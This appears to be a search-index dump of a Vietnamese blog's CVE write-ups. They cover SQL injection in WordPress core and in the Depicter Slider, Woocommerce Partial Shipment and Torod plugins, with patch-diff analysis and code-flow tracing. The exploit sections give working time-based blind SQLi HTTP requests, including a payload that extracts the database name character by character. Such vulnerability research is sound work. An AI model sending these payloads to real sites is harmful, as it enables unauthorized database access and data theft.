thực thi. ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rWordPress là một dự án mã nguồn mở với kho lưu trữ được công khai trên GitHub. Vì vậy, mọi bản vá đều được commit trực tiếp tại đây. Do đó, để phân tích một lỗ hổng, ta chỉ cần tìm đến commit liên quan và quan sát sự thay đổi trong mã nguồn. Trong phần reference của CVE-2022-21661, có liên kết đến commit trên GitHub: So sánh bản vá giữa hai phiên bản Lỗ hổng được vá trong file src/wp-includes/class-wp-tax-query.php Bản lỗi $query['terms'] = array_unique( (array) $query['terms'] ); Ép $query['terms'] thành mảng và loại bỏ giá trị trùng lặp. Không có bước kiểm tra hoặc ép kiểu dữ liệu, dẫn đến nguy cơ chèn dữ liệu không hợp lệ vào truy vấn SQL. Ví dụ: $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e ['1) AND (SELECT SLEEP(5)) # '], 'operator' =\u003e 'IN', ], ], ]; Bản vá if ( 'slug' === $query['field'] || 'name' === $query['field'] ) { $query['terms'] = array_unique( (array) $query['terms'] ); } else { $query['terms'] = wp_parse_id_list( $query['terms'] ); } Bổ sung điều kiện dựa vào $query['field']: Nếu là slug hoặc name =\u003e giữ nguyên cách xử lý cũ. Nếu là ID =\u003e dùng wp_parse_id_list() để ép kiểu dữ liệu thành mảng số nguyên an toàn. Ta biết đây là bước ép kiểu dữ liệu thành mảng số nguyên bởi vì trong tax_query1, tham số field chỉ nhận 4 giá trị: slug, name, term_taxonomy_id và term_id. Trong đó, hai trường term_taxonomy_id và term_id thuộc bảng wp_term_taxonomy và đều có kiểu dữ liệu BIGINT UNSIGNED. mysql\u003e DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ 6 rows in set (0.01 sec) ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rBreakpoint tại đầu hàm clean_query Tiếp tục đến query có taxonomy khớp Quan sát wp_list_pluck ghi đè terms Tránh ghi đè terms bằng return sớm Payload giữ nguyên trong truy vấn thực thi Flow\rĐối tượng WP_Query được tạo Hàm __construct của WP_Query được gọi Gọi get_posts để thực thi query Điều kiện trong get_posts thỏa mãn, gọi get_sql get_sql trả về get_sql_clauses get_sql_clauses gọi get_sql_for_query Duyệt mảng query trong get_sql_for_query Kiểm tra keys terms, taxonomy, operator,... Gọi get_sql_for_clause Bypass clean_query giữ nguyên payload Payload gán vào $sql['where'] Thêm () vào mệnh đề WHERE Thêm AND và trả về get_sql get_posts nhận giá trị từ get_sql Payload thêm vào $clauses['where'] Quan sát last_query tại nơi thực thi SQL Chart minh họa luồng thực thi Biểu đồ luồng thực thi của WP_Query dẫn đến SQLi ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rBreakpoint tại đầu hàm clean_query Tiếp tục đến query có taxonomy khớp Quan sát wp_list_pluck ghi đè terms Tránh ghi đè terms bằng return sớm Payload giữ nguyên trong truy vấn thực thi Flow\rĐối tượng WP_Query được tạo Hàm __construct của WP_Query được gọi Gọi get_posts để thực thi query Điều kiện trong get_posts thỏa mãn, gọi get_sql get_sql trả về get_sql_clauses get_sql_clauses gọi get_sql_for_query Duyệt mảng query trong get_sql_for_query Kiểm tra keys terms, taxonomy, operator,... Gọi get_sql_for_clause Bypass clean_query giữ nguyên payload Payload gán vào $sql['where'] Thêm () vào mệnh đề WHERE Thêm AND và trả về get_sql get_posts nhận giá trị từ get_sql Payload thêm vào $clauses['where'] Quan sát last_query tại nơi thực thi SQL Chart minh họa luồng thực thi Biểu đồ luồng thực thi của WP_Query dẫn đến SQLi ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\rThay giá trị của terms bằng payload SQLi: GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 Kết quả phản hồi cho thấy truy vấn chậm do payload hoạt động ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2022-21661 trong WordPress Core trước phiên bản 5.8.3, quay ngược đến tận phiên bản 3.7.37, xuất phát từ việc làm sạch dữ liệu (sanitization) không đúng cách trong WP_Query dẫn đến lỗ hổng SQL Injection. ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger CVE-2022-21661 Detail ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:6:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Notes\rVì patch nằm trong file src/wp-includes/class-wp-tax-query.php, file này định nghĩa class WP_Tax_Query, chịu trách nhiệm xử lý tham số tax_query trong WP_Query. Nếu có thay đổi trong file này thì gần như chắc chắn nó liên quan đến quá trình parse/validate của tax_query. ↩︎ ","date":"2025-10-01","objectID":"/vi/posts/2025-10-01-cve-2022-21661/:7:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/vi/posts/2025-10-01-cve-2022-21661/#notes"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Depicter Slider của WordPress trước phiên bản 3.6.2. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Depicter Slider: v3.6.1(vul) và v3.6.2(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rNguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ GET request vào SQL query mà không có cơ chế kiểm soát chặt chẽ. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file app/src/Controllers/Ajax/LeadsAjaxController.php index, list, export là 3 hàm đáng chú ý nằm trong class LeadsAjaxController public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } Cả 3 hàm đều được vá bằng cách sử dụng Sanitize::sql thay cho Sanitize::textfield nhằm đảm bảo param 's' được làm sạch và escape phù hợp cho ngữ cảnh câu lệnh SQL. Ảnh minh họa sự khác biệt bản vá và bản lỗi ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rĐể hiểu rõ hơn chức năng của textfield và sql ta tìm kiếm với từ khóa function textfield, có lẽ chúng được đặt trong cùng 1 file vì được gọi bằng cùng 1 class Sanitize Nếu bạn đã cài PHP Intelephense Extension trong vscode, bạn có thể di chuyển đến hàm cụ thể bằng cách Ctrl + Click vào hàm cần đến. Tìm kiếm hàm textfield trong class Sanitize textfield trả về dữ liệu đã được sanitize bằng sanitize_text_field, sql cũng là hàm trong cùng class, trả về dữ liệu đã được escape SQL public static function sql( $input ) { return esc_sql( $input ); } Vì đây là lỗ hổng unauthenticated, việc có 3 hàm như này, ta cần xác định xem điểm gọi đến chúng có cơ chế xác thực hay không. Chỉ sau khi chắc chắn rằng hàm nào thực sự được gọi trong bối cảnh không yêu cầu xác thực, ta mới tiếp tục phân tích phần logic bên trong để kiểm tra khả năng gây ra SQL Injection giúp giới hạn phạm vi truy vết. Để xác định 3 hàm trên được gọi ở đâu, ta có thể tìm kiếm trực tiếp theo tên hàm. Tuy nhiên, các từ khóa như index, list, hay export lại quá phổ biến nên kết quả tìm kiếm sẽ rất nhiều và khó lọc. Vì vậy, thay vì tìm theo tên hàm, ta tìm với từ khóa là tên class LeadsAjaxController. Bởi lẽ khi được sử dụng, các hàm này đều phải được gọi thông qua class, nhờ đó phạm vi kết quả tìm kiếm sẽ được thu hẹp và dễ dàng hơn. Kết quả tìm kiếm LeadsAjaxController trong mã nguồn 👉 LeadsAjaxController được sử dụng trong quá trình đăng ký route Ajax. Khi có request gửi tới endpoint /wp-admin/admin-ajax.php?action=action_here\u0026param1=param1_here\u0026paramN=paramN_here, hệ thống sẽ dựa trên khai báo handle('LeadsAjaxController@function') để gọi tới phương thức tương ứng trong class LeadsAjaxController Cả ba hàm ta đang focus đều được gọi bằng phương thức GET, nhưng export lại có middleware xử lý csrf-api, nên ta bỏ qua. Chỉ truy vết index và list Khi phân tích hai hàm này, ta thấy trong hàm index, biến $response được gán giá trị từ \\Depicter::lead()-\u003eget($args). Tuy nhiên, phương thức get() lại tiếp tục gọi đến \\Depicter::leadRepository()-\u003egetResults($args), tức là cùng một logic mà hàm list đã gọi trực tiếp. Do đó, ta chọn hàm list làm điểm truy vết chính. public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), 'ids' =\u003e Sanitize::textfield($request-\u003equery('ids', '')), 'sources' =\u003e Sanitize::textfield($request-\u003equery('sources', '')), 'dateStart' =\u003e Sanitize::textfield($request-\u003equery('dateStart', '')), 'dateEnd' =\u003e Sanitize::textfield($request-\u003equery('dateEnd', '')), 'order' =\u003e Sanitize::textfield($request-\u003equery('order', 'DESC')), 'orderBy' =\u003e Sanitize::textfield($request-\u003equery('orderBy', 'id')), 'page' =\u003e Sanitize::int($request-\u003equery('page', 1)), 'perPage' =\u003e Sanitize::int($request-\u003equery('perpage', 10)), 'columns' =\u003e Sanitize::textfield($request-\u003equery('columns', '')), 'includeFields' =\u003e Sanitize::textfield($request-\u003equery('includeFields', false)), 'skipCustomFields' =\u003e Sanitize::textfield($request-\u003equery('skipCustomFields', false)) ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } Để biết getResults thực thi query như nào, ta tìm kiếm với từ khóa function getResults hoặc Ctrl + Click vào getResults Vị trí định nghĩa hàm getResults trong LeadRepository 👉 Khi tìm kiếm, ta thấy kết quả có hai hàm getResults. Dựa vào tên class có thể nhận thấy sự liên quan giữa class LeadRepository và hàm leadRepository(), nhiều khả năng Depicter::leadRepository() sẽ trả về một instance của class LeadRepository. Bên cạnh đó, ta có thể dựa vào số lượng tham số truyền vào để xác định chính xác hàm getResults nào mới là hàm cần phân tích. Ta thấy điều kiện if,khi không có param includeFields thì getLeadsResults sẽ được gọi, quan sát getLeadsResults trong cùng class: protected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u003elead()-\u003egetTable(); $leads = Lead::new()-\u003eselect( \"{$leadTable}","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect SQLi\rGửi GET request chứa payload SQLi. GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Payload được decode: 999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - Khi đó một phần của câu query trở thành AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #') Thời gian phản hồi thể hiện payload hoạt động 👉 Dựa trên thời gian phản hồi =\u003e payload hoạt động. Subquery trong mệnh đề FROM: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#detect-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Get First Letter of Database Name\rĐiều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được. Gửi request với SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Sử dụng SUBSTRING() để lấy ký tự đầu tiên của database name, IF() trả về SLEEP(5) nếu ký tự đó là 0x77(‘w’) Sử dụng hex encoding w thành 0x77 vì s được lấy từ GET request trong nên bị escape bởi magic quotes trong WordPress và bởi sanitize_text_field. 👉 Dựa trên thời gian phản hồi =\u003e kí tự đầu tiên đúng là w. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#get-first-letter-of-database-name"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-2011 trong plugin WordPress Depicter Slider trước phiên bản 3.6.2, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection. Bản vá đã escape SQL khiến dữ liệu trước khi đưa vào trở thành chuỗi thuần không thể thoát ra khỏi '%...%' Key takeaways: Kiểm soát kỹ input từ người dùng. Luôn sử dụng $wpdb-\u003eprepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Depicter Slider Plugin \u003c= 3.6.1 is vulnerable to SQL Injection ","date":"2025-09-30","objectID":"/vi/posts/2025-09-30-cve-2025-2011/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/vi/posts/2025-09-30-cve-2025-2011/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Woocommerce Partial Shipment của WordPress trước phiên bản 3.3. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Woocommerce Partial Shipment: v3.2(vul) và v3.3(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Actived WooCommerce plugin: plugin bắt buộc actived trước khi cài Woocommerce Partial Shipment Plugin, một số hàm trong WooCommerce sẽ được sử dụng. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rNguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ POST request vào SQL query mà không có cơ chế kiểm soát chặt chẽ. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file wc-partial-shipment/woocommerce-partial-shipment.php Nhưng ở đây, dev thay đổi khá nhiều ta khó để tìm được vị trí lỗi. Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global $wpdb, ta search từ khóa này trong file wc-partial-shipment/woocommerce-partial-shipment.php để tìm sink. Kết quả tìm vị trí sink trong mã nguồn get_shipment_id và get_wxp_shipment_data là 2 hàm thuộc class WXP_Partial_Shipment đáng chú ý, dữ liệu được đưa thẳng vào câu query mà không có cơ chế kiểm soát nào. Do đó, lỗ hổng SQLi có thể xảy ra. So sánh sự khác biệt giữa bản lỗi và bản vá Bản vá sử dụng $wpdb-\u003eprepare() để chuẩn bị câu query, thay vì nối trực tiếp dữ liệu từ người dùng. Điều này đảm bảo rằng tất cả giá trị được escape đúng cách trước khi chèn vào SQL, ngăn ngừa nguy cơ SQL Injection. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How it work?\rget_shipment_id và get_wxp_shipment_data đều được hàm wxp_order_set_shipped trong cùng class gọi và sử dụng. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } 👉 order_id được lấy từ POST request, nơi người dùng có thể kiểm soát làm đối số khi gọi hàm get_shipment_id và get_wxp_shipment_data truyền vào câu query chứa lổ hỗng SQLi. Để xác định nơi wxp_order_set_shipped được gọi và sử dụng, ta tìm kiếm với từ khóa wxp_order_set_shipped trong thư mục chứa plugin. Tìm vị trí nơi hàm wxp_order_set_shipped được gọi wxp_order_set_shipped được construct của cùng class sử dụng làm callback cho hook wp_ajax_wxp_order_set_shipped =\u003e yêu cầu người dùng phải đăng nhập 👉 Khi truy cập vào /wp-admin/admin-ajax.php với tham số: action=wxp_order_set_shipped\u0026order_id=payload_here Callback wxp_order_set_shipped được gọi order_id được lấy trực tiếp từ request và chèn vào SQL query. Query thực thi 2 lần do được truyền vào 2 hàm chạy lệnh SQL với payload độc hại. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect SQLi\rGửi POST request chứa payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi đó câu query sẽ trở thành: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Ở đây có 2 nơi thực hiện query nên thời gian phản hồi sẽ tăng gấp đôi Kết quả phản hồi khi khai thác thành công Ta sử dụng subquery trong mệnh đề FROM vì truy vấn con được coi như một bảng tạm thời. MySQL sẽ thực thi truy vấn con trước để tạo bảng tạm, sau đó mới thực hiện truy vấn chính. Khi so sánh theo từng row, SLEEP chỉ chạy một lần trong quá trình khởi tạo bảng tạm, các lần so sánh tiếp theo sẽ không thực thi lại, nhờ đó tránh việc SLEEP bị nhân nhiều lần. Ví dụ khi gửi request với payload này: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT SLEEP(5)) Thời gian trả về tăng theo cấp số nhân Thời gian phản hồi tăng theo cấp số nhân ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#detect-sqli"},{"categories":["CVE Analyst"],"collections":null,"content":"Get First Letter of Database Name\rĐiều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được. Gửi request với SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Sử dụng SUBSTRING() để lấy ký tự đầu tiên của database name, IF() trả về SLEEP(5) nếu ký tự đó là 0x77(‘w’) Sử dụng hex encoding w thành 0x77 vì order_id được lấy từ POST request trong nên bị escape bởi magic quotes trong WordPress và bởi sanitize_text_field. 👉 Dựa trên thời gian phản hồi =\u003e kí tự đầu tiên đúng là w. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#get-first-letter-of-database-name"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-48118 trong plugin WordPress Woocommerce Partial Shipment trước phiên bản 3.3, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection. Chưa có bản vá chính thực nào cho lỗ hổng này. Key takeaways: Kiểm soát kỹ input từ người dùng. Luôn sử dụng $wpdb-\u003eprepare() khi làm việc với database trong WordPress để tránh SQL Injection. Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Woocommerce Partial Shipment Plugin \u003c= 3.2 is vulnerable to SQL Injection ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Torod của WordPress. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Torod: v1.9 ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rNguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ POST request vào SQL query mà không có cơ chế quản kiểm soát chặt chẽ. 